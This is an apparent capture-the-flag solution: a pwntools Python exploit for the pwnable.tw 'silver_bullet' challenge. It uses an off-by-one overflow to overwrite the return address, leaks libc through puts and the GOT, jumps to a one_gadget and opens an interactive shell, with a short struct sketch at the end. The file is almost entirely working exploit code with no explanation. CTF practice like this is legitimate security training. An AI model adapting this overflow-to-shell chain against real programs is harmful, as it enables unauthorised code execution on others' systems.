#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./silver_bullet")
    elf = ELF("./silver_bullet")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    oneGadgetOffset = 0x5f7a5

else:
    io = remote("chall.pwnable.tw", 10103)
    elf = ELF("./silver_bullet")
    libc = ELF("./libc_32.so.6")
    oneGadgetOffset = 0x5f065

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def offByOne():
    io.sendlineafter(" :", "1")
    io.sendlineafter(" :", cyclic(0x30 - 1))
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", cyclic(1))

def leakLibc():
    offByOne()
    payload = "\xff\xff\xff" + "bpbp" + p32(elf.symbols["puts"]) + p32(elf.symbols["_start"]) + p32(elf.got["puts"])
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", payload)
    io.sendlineafter(" :", "3")
    libcBase = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
    success("libcBase -> {:#x}".format(libcBase))
    oneGadget = oneGadgetOffset + libcBase
    pause()
    return oneGadget

def getShell(oneGadget):
    offByOne()
    payload = "\xff\xff\xff" + "bpbp" + p32(oneGadget)
    
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", payload)

    pause()
    io.sendlineafter(" :", "3")

if __name__ == "__main__":
    getShell(leakLibc())    

    io.interactive()
    io.close()

'''
struct WEREWOLF
{
	int hp;
	char *name;
}

struct BULLET
{
	char des[0x30];
	int power;
}

'''
